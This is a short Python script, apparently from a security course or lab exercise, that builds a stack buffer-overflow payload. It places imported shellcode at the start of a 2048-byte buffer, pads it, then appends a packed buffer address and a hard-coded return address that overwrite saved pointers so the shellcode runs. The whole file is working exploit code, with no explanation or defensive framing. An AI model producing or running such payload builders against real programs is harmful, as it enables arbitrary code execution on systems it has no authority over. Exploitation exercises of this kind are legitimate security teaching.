import sys
from shellcode import shellcode
import struct

toBeOutputted = shellcode
padding = b"a"* (2048-len(shellcode))
toBeOutputted += padding
bufferAddress = struct.pack("<I", 0xbffed348)
toBeOutputted += bufferAddress
eipAddress = struct.pack("<I", 0xbffedb5c)
toBeOutputted += eipAddress
sys.stdout.buffer.write(toBeOutputted)

